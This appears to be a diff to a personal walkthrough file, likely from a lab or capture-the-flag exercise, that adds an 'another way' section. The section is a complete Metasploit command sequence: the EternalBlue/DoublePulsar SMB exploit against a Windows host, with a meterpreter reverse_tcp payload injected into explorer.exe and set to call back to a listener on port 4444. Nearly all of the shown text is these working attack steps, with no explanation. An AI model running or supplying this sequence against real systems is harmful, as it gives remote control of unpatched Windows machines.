@@ -16,3 +16,18 @@
 15.- exploit
 
 16.- ------WIN--------
+
+
+17.- another way todo
+
+18.- msfconsole
+19.- use exploit/windows/smb/eternalblue_doublepulsar
+20.- show targets
+21.- set target 8
+22.- set payload windows/x64/meterpreter/reverse_tcp
+23.- set processinject explorer.exe
+24.- set targetarchitecture x64
+25.- set rhost 192.168.30.246
+26.- set lhost 192.168.30.149
+27.- set lport 4444
+28.- run
